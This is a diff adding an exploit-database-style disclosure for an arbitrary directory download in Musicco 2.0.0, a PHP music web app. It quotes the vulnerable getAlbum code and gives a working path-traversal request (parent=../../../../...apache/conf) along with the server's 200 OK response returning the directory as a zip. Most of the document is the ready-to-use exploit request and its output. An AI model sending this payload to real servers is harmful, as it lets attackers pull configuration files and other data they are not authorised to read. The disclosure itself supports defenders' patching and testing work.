@@ -1,0 +1,43 @@
+# Exploit Title: Musicco 2.0.0 - Arbitrary Directory Download
+# Dork: N/A
+# Date: 2018-11-09
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.musicco.app/
+# Software Link: https://codeload.github.com/micser/musicco/zip/master
+# Version: 2.0.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/?getAlbum&parent=[Directory]&album=Efe 
+
+# /[PATH]/index.php
+#3592 	} elseif (isset($_GET['getAlbum'])) {
+#3593 			$parent = $_GET['parent'];
+#3594 			$album = $_GET['album'];
+#3595 			$rootPath = realpath($parent);
+#3596 			$zip = new ZipArchive();
+#3597 			$zip->open('./'.Musicco::getConfig('tempFolder').'/'.$album.'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
+
+GET /[PATH]/?getAlbum&parent=../../../../Efe_S1/apache/conf&album=Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 09 Nov 2018 14:24:42 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: musicco=rlparl6g67tsok72of1ln5tj23; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Disposition: attachment;filename="Efe.zip"
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: application/zip, application/octet-stream
